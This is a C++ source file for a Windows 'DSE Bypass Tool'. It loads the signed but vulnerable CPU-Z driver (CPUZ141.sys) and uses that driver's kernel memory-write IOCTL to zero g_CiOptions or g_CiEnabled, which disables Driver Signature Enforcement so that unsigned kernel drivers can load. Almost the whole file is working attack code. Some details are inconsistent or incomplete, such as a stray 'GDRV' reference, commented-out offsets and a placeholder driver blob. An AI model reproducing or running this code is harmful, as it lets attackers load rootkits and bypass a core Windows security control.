#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <versionhelpers.h>
#include <exception>

// Define NT structures and macros manually to avoid conflicts
#ifndef _NTDEF_
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef LONG NTSTATUS;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// PEB and TEB structures for version detection
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
    DWORD OSMajorVersion;
    DWORD OSMinorVersion;
    WORD OSBuildNumber;
    WORD OSCSDVersion;
} PEB, *PPEB;

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
} TEB, *PTEB;

// Forward declarations for NT functions
extern "C" {
    NTSYSAPI VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
}

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

// IOCTL codes for CPU-Z driver
#define IOCTL_CPUZ_READ_MEMORY 0x9C402430
#define IOCTL_CPUZ_WRITE_MEMORY 0x9C40A434

// Driver paths
#define DRIVER_PATH L"C:\\Windows\\System32\\Drivers\\CPUZ141.sys"
#define DRIVER_PATH_NT L"\\SystemRoot\\System32\\Drivers\\CPUZ141.sys"
#define DRIVER_REGISTRY_PATH L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\CPUZ141"

// Registry keys
#define REGISTRY_SERVICE_KEY L"System\\CurrentControlSet\\Services\\CPUZ141"
#define REGISTRY_DRIVER_KEY L"System\\CurrentControlSet\\Services\\CPUZ141"

// External driver binary (embedded)
extern "C" const unsigned char driver_data[];
extern "C" const unsigned int driver_data_size;

// NT API function declarations
typedef NTSTATUS(WINAPI* pNtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(WINAPI* pNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* pRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);

// System Information Classes
#define SystemCodeIntegrityInformation 0x67
#define SystemModuleInformation 0x0B

// Structure for kernel module information
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// Structures for CPU-Z memory access
// CPU-Z uses different IOCTL structures than GDRV
// Read/Write operations use address and size parameters

// Console color helpers
enum ConsoleColor {
    COLOR_RED = FOREGROUND_RED,
    COLOR_GREEN = FOREGROUND_GREEN,
    COLOR_BLUE = FOREGROUND_BLUE,
    COLOR_YELLOW = FOREGROUND_RED | FOREGROUND_GREEN,
    COLOR_CYAN = FOREGROUND_GREEN | FOREGROUND_BLUE,
    COLOR_WHITE = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE,
    COLOR_BRIGHT_GREEN = FOREGROUND_GREEN | FOREGROUND_INTENSITY,
    COLOR_BRIGHT_BLUE = FOREGROUND_BLUE | FOREGROUND_INTENSITY
};

class DSEBypass {
private:
    pNtLoadDriver NtLoadDriver;
    pNtUnloadDriver NtUnloadDriver;
    pNtQuerySystemInformation NtQuerySystemInformation;
    pRtlAdjustPrivilege RtlAdjustPrivilege;
    pRtlGetVersion RtlGetVersion;
    
    HANDLE hDriver;
    PVOID g_CiEnabledAddress;
    ULONG originalCiOptions;
    
    void SetConsoleColor(ConsoleColor color) {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, color);
    }
    
    void PrintColored(const char* message, ConsoleColor color) {
        SetConsoleColor(color);
        printf("%s", message);
        SetConsoleColor(COLOR_WHITE);
    }
    
    bool LoadNtApis() {
        printf("  [DEBUG] Loading NT APIs...\n");
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) {
            printf("  [ERROR] Failed to get ntdll.dll handle\n");
            return false;
        }
        
        NtLoadDriver = (pNtLoadDriver)GetProcAddress(hNtdll, "NtLoadDriver");
        NtUnloadDriver = (pNtUnloadDriver)GetProcAddress(hNtdll, "NtUnloadDriver");
        NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
        RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
        
        bool result = NtLoadDriver && NtUnloadDriver && NtQuerySystemInformation && 
                      RtlAdjustPrivilege && RtlGetVersion;
        if (result) {
            printf("  [DEBUG] All NT APIs loaded successfully\n");
        } else {
            printf("  [ERROR] Failed to load some NT APIs\n");
        }
        return result;
    }
    
    bool AcquireLoadDriverPrivilege() {
        printf("  [DEBUG] Acquiring SeLoadDriverPrivilege...\n");
        BOOLEAN wasEnabled;
        NTSTATUS status = RtlAdjustPrivilege(10, TRUE, FALSE, &wasEnabled); // SE_LOAD_DRIVER_PRIVILEGE
        
        if (!NT_SUCCESS(status)) {
            PrintColored("Fatal error: failed to acquire SeLoadDriverPrivilege\n", COLOR_RED);
            return false;
        }
        return true;
    }
    
    bool WriteDriverFile() {
        printf("  [DEBUG] Checking driver file...\n");
        // Check if driver already exists in destination
        if (GetFileAttributesW(DRIVER_PATH) != INVALID_FILE_ATTRIBUTES) {
            PrintColored("Driver file already exists in System32\\Drivers\n", COLOR_GREEN);
            return true;
        }
        
        // Get the path of the current executable
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        
        // Extract directory path
        wchar_t exeDir[MAX_PATH];
        wcscpy_s(exeDir, exePath);
        wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
        if (lastSlash) {
            *(lastSlash + 1) = L'\0';
        }
        
        // Check for CPUZ141.sys in the same directory as the exe
        wchar_t localDriverPath[MAX_PATH];
        swprintf_s(localDriverPath, L"%sCPUZ141.sys", exeDir);
        
        if (GetFileAttributesW(localDriverPath) != INVALID_FILE_ATTRIBUTES) {
            PrintColored("Found CPUZ141.sys in executable directory, copying to System32\\Drivers...\n", COLOR_YELLOW);
            
            // Copy file to destination
            if (CopyFileW(localDriverPath, DRIVER_PATH, FALSE)) {
                PrintColored("Driver file copied successfully\n", COLOR_GREEN);
                return true;
            } else {
                PrintColored("Failed to copy driver file\n", COLOR_RED);
                printf("Error code: %d\n", GetLastError());
                return false;
            }
        }
        
        // If not found locally, try to write from embedded data
        PrintColored("Driver not found locally, trying embedded data...\n", COLOR_YELLOW);
        
        if (driver_data_size < 100) {
            PrintColored("ERROR: No valid driver found!\n", COLOR_RED);
            printf("Please place CPUZ141.sys in the same folder as this executable.\n");
            return false;
        }
        
        HANDLE hFile = CreateFileW(DRIVER_PATH, GENERIC_WRITE, 0, nullptr, CREATE_NEW, 
                                   FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hFile == INVALID_HANDLE_VALUE) {
            PrintColored("Failed to create driver file\n", COLOR_RED);
            printf("Error code: %d\n", GetLastError());
            return false;
        }
        
        DWORD bytesWritten;
        bool success = WriteFile(hFile, driver_data, driver_data_size, &bytesWritten, nullptr);
        CloseHandle(hFile);
        
        return success;
    }
    
    bool CreateDriverService() {
        printf("  [DEBUG] Creating driver service registry keys...\n");
        
        HKEY hKey;
        LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, REGISTRY_SERVICE_KEY, 0, nullptr,
                                      REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
        
        if (result != ERROR_SUCCESS) {
            PrintColored("Failed to create service registry key\n", COLOR_RED);
            return false;
        }
        
        // Set Type = SERVICE_KERNEL_DRIVER (1)
        DWORD type = 1;
        RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
        
        // Set ErrorControl = SERVICE_ERROR_NORMAL (1)
        DWORD errorControl = 1;
        RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(errorControl));
        
        // Set Start = SERVICE_DEMAND_START (3)
        DWORD start = 3;
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(start));
        
        // Set ImagePath (must use NT-style path)
        RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ, (BYTE*)DRIVER_PATH_NT, 
                      (wcslen(DRIVER_PATH_NT) + 1) * sizeof(wchar_t));
        
        RegCloseKey(hKey);
        PrintColored("Registry keys created successfully\n", COLOR_GREEN);
        return true;
    }
    
    bool ValidateDriverFile() {
        HANDLE hFile = CreateFileW(DRIVER_PATH, GENERIC_READ, FILE_SHARE_READ, 
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            PrintColored("Driver file not found!\n", COLOR_RED);
            return false;
        }
        
        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize < 1000 || fileSize > 1024 * 1024) { // Between 1KB and 1MB
            PrintColored("Driver file size is suspicious!\n", COLOR_RED);
            CloseHandle(hFile);
            return false;
        }
        
        // Read PE header
        IMAGE_DOS_HEADER dosHeader;
        DWORD bytesRead;
        ReadFile(hFile, &dosHeader, sizeof(dosHeader), &bytesRead, nullptr);
        
        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
            PrintColored("Invalid PE file!\n", COLOR_RED);
            CloseHandle(hFile);
            return false;
        }
        
        CloseHandle(hFile);
        printf("  [DEBUG] Driver file validated (Size: %d bytes)\n", fileSize);
        return true;
    }
    
    bool LoadCpuzDriver() {
        printf("  [DEBUG] Loading CPU-Z driver...\n");
        
        // Validate driver file first
        if (!ValidateDriverFile()) {
            return false;
        }
        
        // Create service registry keys first
        if (!CreateDriverService()) {
            return false;
        }
        
        PrintColored("\n[WARNING] About to load kernel driver. This may cause system instability!\n", COLOR_YELLOW);
        printf("Press Ctrl+C within 3 seconds to abort...\n");
        Sleep(3000);
        
        UNICODE_STRING driverServiceName = {0};
        RtlInitUnicodeString(&driverServiceName, DRIVER_REGISTRY_PATH);
        
        printf("  [DEBUG] Calling NtLoadDriver...\n");
        NTSTATUS status = NtLoadDriver(&driverServiceName);
        if (NT_SUCCESS(status)) {
            PrintColored("Driver loaded successfully\n", COLOR_BRIGHT_GREEN);
            return true;
        }
        
        // Driver might already be loaded
        if (status == 0xC000010E) { // STATUS_IMAGE_ALREADY_LOADED
            PrintColored("Driver already loaded\n", COLOR_YELLOW);
            return true;
        }
        
        PrintColored("Failed to load driver. NTSTATUS: ", COLOR_RED);
        printf("0x%08X\n", status);
        return false;
    }
    
    bool OpenDriverHandle() {
        printf("  [DEBUG] Opening driver handle...\n");
        hDriver = CreateFileW(L"\\\\.\\CPUZ141", GENERIC_READ | GENERIC_WRITE, 
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDriver == INVALID_HANDLE_VALUE) {
            PrintColored("Failed to obtain handle to device\n", COLOR_RED);
            return false;
        }
        return true;
    }
    
    PVOID GetKernelModuleBase(const char* moduleName) {
        ULONG bufferSize = 0;
        NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &bufferSize);
        
        if (bufferSize == 0) return nullptr;
        
        PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(bufferSize);
        if (!modules) return nullptr;
        
        status = NtQuerySystemInformation(SystemModuleInformation, modules, bufferSize, &bufferSize);
        if (!NT_SUCCESS(status)) {
            free(modules);
            return nullptr;
        }
        
        PVOID moduleBase = nullptr;
        for (ULONG i = 0; i < modules->NumberOfModules; i++) {
            const char* currentName = (const char*)modules->Modules[i].FullPathName + 
                                     modules->Modules[i].OffsetToFileName;
            
            if (_stricmp(currentName, moduleName) == 0) {
                moduleBase = modules->Modules[i].ImageBase;
                break;
            }
        }
        
        free(modules);
        return moduleBase;
    }
    
    PVOID FindPatternInModule(HMODULE hModule, const BYTE* pattern, const char* mask, DWORD sectionName) {
        if (!hModule) return nullptr;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return nullptr;
        
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        
        // Search in .data or .rdata section
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
            if (*(DWORD*)section->Name == sectionName || 
                (sectionName == 0 && (strncmp((char*)section->Name, ".data", 5) == 0 ||
                                      strncmp((char*)section->Name, ".rdata", 6) == 0))) {
                
                BYTE* sectionStart = (BYTE*)hModule + section->VirtualAddress;
                DWORD sectionSize = section->Misc.VirtualSize;
                
                size_t patternLen = strlen(mask);
                for (DWORD j = 0; j < sectionSize - patternLen; j++) {
                    bool found = true;
                    for (size_t k = 0; k < patternLen; k++) {
                        if (mask[k] != '?' && pattern[k] != sectionStart[j + k]) {
                            found = false;
                            break;
                        }
                    }
                    if (found) {
                        return &sectionStart[j];
                    }
                }
            }
        }
        return nullptr;
    }
    
    PVOID FindCiVariable() {
        RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
        RtlGetVersion(&osvi);
        
        const wchar_t* symbolName;
        const wchar_t* moduleName;
        HMODULE hModule = nullptr;
        PVOID kernelBase = nullptr;
        PVOID targetAddress = nullptr;
        
        // Determine which symbol and module to search based on Windows version
        if (osvi.dwBuildNumber >= 0x23F0) {
            symbolName = L"CI!g_CiOptions";
            moduleName = L"CI.dll";
            
            // Get CI.dll base address from kernel
            kernelBase = GetKernelModuleBase("CI.dll");
            if (!kernelBase) {
                PrintColored("Failed to find CI.dll in kernel\n", COLOR_RED);
                return nullptr;
            }
            
            // Load CI.dll from System32 for pattern analysis
            wchar_t ciPath[MAX_PATH];
            GetSystemDirectoryW(ciPath, MAX_PATH);
            wcscat_s(ciPath, L"\\CI.dll");
            hModule = LoadLibraryExW(ciPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
        } else {
            symbolName = L"nt!g_CiEnabled";
            moduleName = L"ntoskrnl.exe";
            
            // Get ntoskrnl.exe base address from kernel
            kernelBase = GetKernelModuleBase("ntoskrnl.exe");
            if (!kernelBase) {
                PrintColored("Failed to find ntoskrnl.exe in kernel\n", COLOR_RED);
                return nullptr;
            }
            
            // Load ntoskrnl.exe from System32 for pattern analysis
            wchar_t ntPath[MAX_PATH];
            GetSystemDirectoryW(ntPath, MAX_PATH);
            wcscat_s(ntPath, L"\\ntoskrnl.exe");
            hModule = LoadLibraryExW(ntPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
        }
        
        if (!hModule) {
            PrintColored("Failed to load module for analysis\n", COLOR_RED);
            return nullptr;
        }
        
        PrintColored("Searching for ", COLOR_WHITE);
        wprintf(L"%ls at kernel base 0x%p\n", symbolName, kernelBase);
        
        // Pattern for g_CiOptions/g_CiEnabled - typically found in .data section
        // These are usually initialized DWORD/BYTE values
        PVOID localAddress = nullptr;
        
        if (osvi.dwBuildNumber >= 0x23F0) {
            // Pattern for g_CiOptions (Windows 10+)
            // Look for references to SeCiCallbacks or known init patterns
            BYTE pattern[] = { 0x06, 0x00, 0x00, 0x00 }; // Default CiOptions value
            const char* mask = "xxxx";
            localAddress = FindPatternInModule(hModule, pattern, mask, 0);
        } else {
            // Pattern for g_CiEnabled (Windows 7/8)
            BYTE pattern[] = { 0x01 }; // Typically initialized to 1
            const char* mask = "x";
            localAddress = FindPatternInModule(hModule, pattern, mask, 0);
        }
        
        if (localAddress) {
            // Calculate offset from module base
            SIZE_T offset = (SIZE_T)localAddress - (SIZE_T)hModule;
            targetAddress = (PVOID)((SIZE_T)kernelBase + offset);
            
            PrintColored("Found variable at offset: ", COLOR_WHITE);
            printf("0x%zX\n", offset);
        } else {
            // Fallback: use hardcoded offsets for known builds
            PrintColored("Using fallback method...\n", COLOR_YELLOW);
            
            // Common offsets for different Windows versions (these may vary!)
            // Note: These are example offsets and need to be determined for each build
            SIZE_T offset = 0;
            if (osvi.dwBuildNumber >= 22000) {  // Windows 11
                // offset = 0xC1C6A0; // Example offset - needs verification
            } else if (osvi.dwBuildNumber >= 19041) {  // Windows 10 20H1+
                // offset = 0xC1C6A0; // Example offset - needs verification
            }
            
            if (offset > 0) {
                targetAddress = (PVOID)((SIZE_T)kernelBase + offset);
            }
        }
        
        FreeLibrary(hModule);
        
        if (!targetAddress) {
            PrintColored("Failed to find CI variable address\n", COLOR_RED);
            return nullptr;
        }
        
        wprintf(L"Resolved %ls to kernel address: 0x%p\n", symbolName, targetAddress);
        return targetAddress;
    }
    
    bool WriteCiOptions(PVOID targetAddress, ULONG newValue, PULONG oldValue) {
        if (!hDriver) return false;
        
        // Determine size based on Windows version
        RTL_OSVERSIONINFOW osvi = { sizeof(osvi) };
        RtlGetVersion(&osvi);
        ULONG size = (osvi.dwBuildNumber >= 0x23F0) ? sizeof(ULONG) : sizeof(BYTE);
        
        // Read original value if requested
        if (oldValue) {
            struct {
                ULONGLONG Address;
                ULONG Size;
            } readInput = { (ULONGLONG)targetAddress, size };
            
            DWORD bytesReturned;
            if (!DeviceIoControl(hDriver, IOCTL_CPUZ_READ_MEMORY, &readInput, sizeof(readInput),
                               oldValue, sizeof(ULONG), &bytesReturned, nullptr)) {
                return false;
            }
        }
        
        // Write new value using CPU-Z IOCTL
        struct {
            ULONGLONG Address;
            ULONG Size;
            ULONG Value;
        } writeInput = { (ULONGLONG)targetAddress, size, newValue };
        
        DWORD bytesReturned;
        return DeviceIoControl(hDriver, IOCTL_CPUZ_WRITE_MEMORY, &writeInput, sizeof(writeInput),
                              nullptr, 0, &bytesReturned, nullptr);
    }
    
    bool CheckCodeIntegrity() {
        // Use a buffer for SYSTEM_CODEINTEGRITY_INFORMATION since the struct may be incomplete in winternl.h
        struct {
            ULONG Length;
            ULONG CodeIntegrityOptions;
        } ciInfo = { sizeof(ciInfo), 0 };
        
        NTSTATUS status = NtQuerySystemInformation(SystemCodeIntegrityInformation, 
                                                   &ciInfo, sizeof(ciInfo), nullptr);
        
        if (!NT_SUCCESS(status)) {
            PrintColored("Failed to query code integrity status\n", COLOR_RED);
            return false;
        }
        
        // Check if CI is enabled (bit 0 and 1)
        if ((ciInfo.CodeIntegrityOptions & 0x03) == 0x01) {
            return true; // CI is enabled
        }
        
        PrintColored("WARNING: CI is already disabled!\n", COLOR_YELLOW);
        return false;
    }
    
    void Cleanup() {
        if (hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(hDriver);
            hDriver = INVALID_HANDLE_VALUE;
        }
        
        // Unload driver
        UNICODE_STRING driverServiceName = {0};
        RtlInitUnicodeString(&driverServiceName, DRIVER_REGISTRY_PATH);
        NtUnloadDriver(&driverServiceName);
        
        // Delete driver file
        DeleteFileW(DRIVER_PATH);
        
        // Delete registry keys
        SHDeleteKeyW(HKEY_LOCAL_MACHINE, REGISTRY_SERVICE_KEY);
    }
    
public:
    DSEBypass() : hDriver(INVALID_HANDLE_VALUE), g_CiEnabledAddress(nullptr), originalCiOptions(0) {}
    
    ~DSEBypass() {
        Cleanup();
    }
    
    bool Initialize() {
        if (!LoadNtApis()) {
            PrintColored("Failed to load NT APIs\n", COLOR_RED);
            return false;
        }
        
        if (!AcquireLoadDriverPrivilege()) {
            return false;
        }
        
        if (!WriteDriverFile()) {
            PrintColored("Failed to write driver file\n", COLOR_RED);
            return false;
        }
        
        if (!LoadCpuzDriver()) {
            PrintColored("Failed to load CPU-Z driver\n", COLOR_RED);
            return false;
        }
        
        if (!OpenDriverHandle()) {
            return false;
        }
        
        return true;
    }
    
    bool DisableDSE() {
        if (!CheckCodeIntegrity()) {
            return false;
        }
        
        g_CiEnabledAddress = FindCiVariable();
        if (!g_CiEnabledAddress) {
            PrintColored("Failed to find CI variable address\n", COLOR_RED);
            return false;
        }
        
        wprintf(L"Found CI variable at 0x%p\n", g_CiEnabledAddress);
        
        if (!WriteCiOptions(g_CiEnabledAddress, 0, &originalCiOptions)) {
            PrintColored("Failed to disable DSE through GDRV\n", COLOR_RED);
            return false;
        }
        
        PrintColored("Successfully disabled DSE.\n", COLOR_BRIGHT_GREEN);
        printf(" Original g_CiOptions value: 0x%08X\n", originalCiOptions);
        
        return true;
    }
    
    bool EnableDSE() {
        if (!g_CiEnabledAddress) {
            PrintColored("DSE was not disabled by this tool\n", COLOR_YELLOW);
            return false;
        }
        
        if (!WriteCiOptions(g_CiEnabledAddress, originalCiOptions, nullptr)) {
            PrintColored("WARNING: failed to re-enable DSE\n", COLOR_RED);
            return false;
        }
        
        PrintColored("Successfully re-enabled DSE.\n", COLOR_BRIGHT_GREEN);
        return true;
    }
};

int main() {
    // Attach to parent console or allocate new one to see output
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        AllocConsole();
    }
    
    // Redirect stdout
    FILE* fpStdout;
    freopen_s(&fpStdout, "CONOUT$", "w", stdout);
    
    SetConsoleTitleW(L"DSE Bypass Tool");
    
    printf("=== DSE Bypass Tool Started ===\n");
    printf("Press Ctrl+C to abort at any time\n\n");
    
    printf("Do you want to disable DSE? ");
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, COLOR_BRIGHT_GREEN);
    printf("| Type : Yes | \n");
    SetConsoleTextAttribute(hConsole, COLOR_WHITE);
    
    char input[32] = { 0 };
    if (scanf_s("%31s", input, (unsigned)sizeof(input)) != 1) {
        printf("Failed to read input\n");
        printf("\nPress Enter to exit...");
        getchar();
        return 1;
    }
    
    // Check if user typed "Yes"
    if (strcmp(input, "Yes") != 0) {
        printf("Operation cancelled.\n");
        printf("\nPress Enter to exit...");
        getchar();
        getchar();
        return 0;
    }
    
    printf("\n[DEBUG] Creating DSEBypass object...\n");
    
    try {
        DSEBypass dseBypass;
        
        printf("[DEBUG] Starting initialization...\n");
        if (!dseBypass.Initialize()) {
            printf("Initialization failed.\n");
            printf("\nPress Enter to exit...");
            getchar();
            getchar();
            return 1;
        }
        printf("[DEBUG] Initialization completed successfully\n");
        
        if (!dseBypass.DisableDSE()) {
            printf("Failed to disable DSE.\n");
            printf("\nPress Enter to exit...");
            getchar();
            getchar();
            return 1;
        }
        
        // Wait for user confirmation to re-enable
        printf("\nAre you ready to ( re-enable DSE and unload driver ) ? | Type : Yes |\n");
        
        char confirm[32] = { 0 };
        scanf_s("%31s", confirm, (unsigned)sizeof(confirm));
        
        // If user types "no", wait 3 seconds
        if (strcmp(confirm, "no") == 0) {
            printf("Waiting for your confirmation...\n");
            Sleep(3000);
        }
        
        // Check again for "Yes"
        while (strcmp(confirm, "Yes") != 0) {
            printf("Type 'Yes' to continue: ");
            scanf_s("%31s", confirm, (unsigned)sizeof(confirm));
        }
        
        if (!dseBypass.EnableDSE()) {
            printf("Failed to re-enable DSE.\n");
            printf("\nPress Enter to exit...");
            getchar();
            getchar();
            return 1;
        }
        
        printf("\nOperation completed successfully.\n");
        printf("\nPress Enter to exit...");
        getchar();
        getchar();
    }
    catch (const std::exception & e) {
        printf("\n[EXCEPTION] %s\n", e.what());
        printf("\nPress Enter to exit...");
        getchar();
        return 1;
    }
    catch (...) {
        printf("\n[EXCEPTION] Unknown error occurred\n");
        printf("\nPress Enter to exit...");
        getchar();
        return 1;
    }
    
    return 0;
}

// Placeholder for driver binary data
// In production, you would embed the actual gdrv.sys binary here
extern "C" {
    const unsigned char driver_data[] = { 0x4D, 0x5A }; // MZ header placeholder
    const unsigned int driver_data_size = sizeof(driver_data);
}
